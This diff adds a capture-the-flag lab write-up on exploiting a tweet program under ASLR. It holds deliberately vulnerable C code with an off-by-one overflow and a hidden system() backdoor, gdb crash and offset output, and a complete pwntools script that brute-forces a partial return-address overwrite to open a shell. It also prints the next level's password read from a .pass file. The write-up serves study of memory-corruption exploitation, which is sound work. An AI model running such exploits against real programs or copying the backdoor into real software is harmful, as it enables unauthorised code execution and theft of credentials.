@@ -1,0 +1,260 @@
+/*
+Exploitation with ASLR
+Lab C
+
+ gcc -pie -fPIE -fno-stack-protector -o lab6C lab6C.c
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+struct savestate {
+    char tweet[140];
+    char username[40];
+    int msglen;
+} save;
+
+void set_tweet(struct savestate *save );
+void set_username(struct savestate * save);
+
+/* debug functionality, not used in production */
+void secret_backdoor()
+{
+    char cmd[128];
+
+    /* reads a command and executes it */
+    fgets(cmd, 128, stdin);
+    system(cmd);
+
+    return;
+}
+
+void handle_tweet()
+{
+    struct savestate save;
+
+    /* Initialize our save state to sane values. */
+    memset(save.username, 0, 40);
+    save.msglen = 140;
+
+    /* read a username and tweet from the user */
+    set_username(&save);
+    set_tweet(&save);
+
+    printf(">: Tweet sent!\n");
+    return;
+}
+
+void set_tweet(struct savestate *save )
+{
+    char readbuf[1024];
+    memset(readbuf, 0, 1024);
+
+    printf(">: Tweet @Unix-Dude\n");
+    printf(">>: ");
+
+    /* read a tweet from the user, safely copy it to struct */
+    fgets(readbuf, 1024, stdin);
+    strncpy(save->tweet, readbuf, save->msglen);
+
+    return;
+}
+
+void set_username(struct savestate * save)
+{
+    int i;
+    char readbuf[128];
+    memset(readbuf, 0, 128);
+
+    printf(">: Enter your username\n");
+    printf(">>: ");
+
+    /* Read and copy the username to our savestate */
+    fgets(readbuf, 128, stdin);
+    for(i = 0; i <= 40 && readbuf[i]; i++)
+        save->username[i] = readbuf[i];
+
+    printf(">: Welcome, %s", save->username);
+    return;
+}
+
+int main(int argc, char * argv[])
+{
+
+    printf(
+    "--------------------------------------------\n" \
+    "|   ~Welcome to l33t-tw33ts ~    v.0.13.37 |\n" \
+    "--------------------------------------------\n");
+
+    /* make some tweets */
+    handle_tweet();
+
+    return EXIT_SUCCESS;
+}
+
+It seems there there might be a couple of exploits here. Some to note are the save->username to set save->msglen to a greater length and save->tweet to overwrite the return address of handle_tweet.
+
+
+Let's see if we can overwrite this address.
+
+gdb-peda$ pattern create 300 pattern
+Writing pattern of 300 chars to filename "pattern"
+gdb-peda$ ! (python -c 'print("X"*40 + "\xff")'; cat pattern) > pattern2
+gdb-peda$ cat pattern2
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%
+
+lab6C@warzone:/tmp/lab6C$ gdb /levels/lab06/lab6C
+Reading symbols from /levels/lab06/lab6C...(no debugging symbols found)...done.
+gdb-peda$ r < pattern2
+Starting program: /levels/lab06/lab6C < pattern2
+--------------------------------------------
+|   ~Welcome to l33t-tw33ts ~    v.0.13.37 |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX>: Tweet @Unix-Dude
+>>: >: Tweet sent!
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0xf
+EBX: 0x41417541 ('AuAA')
+ECX: 0xb7fd8000 (">>: >: Tweet sent!\n", 'X' <repeats 37 times>, "\377>: Tweet @Unix-Dude\n")
+EDX: 0xb7fce898 --> 0x0
+ESI: 0x0
+EDI: 0x0
+EBP: 0x7641415a ('ZAAv')
+ESP: 0xbffff6f0 ("AxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%\277D\367\377\277$ ")
+EIP: 0x41774141 ('AAwA')
+EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x41774141
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff6f0 ("AxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%\277D\367\377\277$ ")
+0004| 0xbffff6f4 ("yAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%\277D\367\377\277$ ")
+0008| 0xbffff6f8 ("A%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%\277D\367\377\277$ ")
+0012| 0xbffff6fc ("%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%\277D\367\377\277$ ")
+0016| 0xbffff700 ("BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%\277D\367\377\277$ ")
+0020| 0xbffff704 ("A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%\277D\367\377\277$ ")
+0024| 0xbffff708 ("%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%\277D\367\377\277$ ")
+0028| 0xbffff70c ("-A%(A%DA%;A%)A%EA%aA%0A%FA%\277D\367\377\277$ ")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x41774141 in ?? ()
+gdb-peda$ pattern offset $eip
+1098334529 found at offset: 196
+
+We've now found the offset from the buffer of save->tweet.
+
+gdb-peda$ disassemble handle_tweet
+0x800007ec <+114>:   ret
+End of assembler dump.
+
+gdb-peda$ b *handle_tweet+114
+
+gdb-peda$ p secret_backdoor
+$3 = {<text variable, no debug info>} 0x8000072b <secret_backdoor>
+
+0000| 0xbf8ff59c --> 0xb77cf98a (<main+40>:     mov    eax,0x0)
+
+Running it again in a seperate terminal should give a different address. Let's see if this works
+
+0000| 0xbfe5c55c --> 0xb777c98a (<main+40>:     mov    eax,0x0)
+
+It looks like the last 3 digits of the address remain the same.
+
+I need to construct a python program that has a payload and can bruteforce this solution since it is only in 32 bit 
+
+  1 from pwn import *
+  2
+  3 def exploit():
+  4     while True:
+  5         #Start lab6C
+  6         p = process("./lab6C")
+  7
+  8         #Read the initial output from the program
+  9         p.recv(200)
+ 10
+ 11         #Send the payload to overflow the buffer
+ 12         payload = "X" * 40 + "\xc6"
+ 13         p.sendline(payload)
+ 14         p.recv(200)
+ 15
+ 16         # Construct the payload with address
+ 17         exploit_payload = "X" * 196
+ 18         exploit_payload += p32(0x072b)
+ 19         p.sendline(exploit_payload)
+ 20
+ 21         #Sending shell command and whoami command
+ 22         p.sendline("/bin/sh")
+ 23         p.sendline("whoami")
+ 24
+ 25         #Check if the exploit was successful
+ 26         ret = p.recv(200)
+ 27         if "lab6B" in ret:
+ 28             p.interactive()
+ 29             break
+ 30
+ 31 if __name__ == "__main__":
+ 32     exploit()
+ 33
+
+lab6C@warzone:/levels/lab06$ python /tmp/lab06/exploit.py
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[+] Starting program './lab6C': Done
+[*] Switching to interactive mode
+$ whoami
+lab6B
+$ cat /home/lab6B/.pass
+p4rti4l_0verwr1tes_r_3nuff
+
+
+Why do I have to use a separate terminal?
+Can you run pwntools in gdb?
